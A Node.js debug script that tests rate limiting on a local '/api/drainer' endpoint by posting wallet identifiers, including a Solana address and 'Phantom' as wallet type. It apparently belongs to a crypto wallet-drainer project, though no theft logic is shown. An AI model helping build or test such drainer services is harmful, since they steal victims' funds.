#!/usr/bin/env node

// Debug Rate Limiting Script
// Run with: node debug-rate-limit.js

async function debugRateLimit() {
  console.log('🔍 Debugging Rate Limiting...\n');
  
  try {
    // Test 1: Single request
    console.log('1️⃣ Testing single request...');
    const response1 = await fetch('http://localhost:3000/api/drainer', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        user: 'debug-wallet-1',
        walletType: 'Phantom'
      })
    });
    
    console.log(`   Status: ${response1.status}`);
    console.log(`   Headers:`, Object.fromEntries(response1.headers.entries()));
    
    if (response1.ok) {
      const data1 = await response1.json();
      console.log(`   Response:`, JSON.stringify(data1, null, 2));
    } else {
      const error1 = await response1.json();
      console.log(`   Error:`, JSON.stringify(error1, null, 2));
    }
    
    // Wait a bit
    await new Promise(resolve => setTimeout(resolve, 1000));
    
          // Test 2: Multiple requests to trigger rate limiting
      console.log('\n2️⃣ Testing multiple requests...');
      const responses = [];
      
      for (let i = 0; i < 5; i++) {
        const response = await fetch('http://localhost:3000/api/drainer', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            user: 'FLeDqdHg1TzG5x3Sjd1Q6sdUAqUzpEZuw1VnXHPm88Nj',
            walletType: `Wallet${i}`
          })
        });
      
      responses.push({
        request: i,
        status: response.status,
        headers: Object.fromEntries(response.headers.entries())
      });
      
      if (response.ok) {
        const data = await response.json();
        responses[responses.length - 1].response = data;
      } else {
        const error = await response.json();
        responses[responses.length - 1].error = error;
      }
      
      // Small delay
      await new Promise(resolve => setTimeout(resolve, 100));
    }
    
    console.log('   Responses:');
    responses.forEach((r, i) => {
      console.log(`     Request ${i}: Status ${r.status}`);
      if (r.response) console.log(`       Success: ${JSON.stringify(r.response, null, 2)}`);
      if (r.error) console.log(`       Error: ${JSON.stringify(r.error, null, 2)}`);
    });
    
  } catch (error) {
    console.error('❌ Debug failed:', error.message);
  }
}

// Run debug
debugRateLimit();
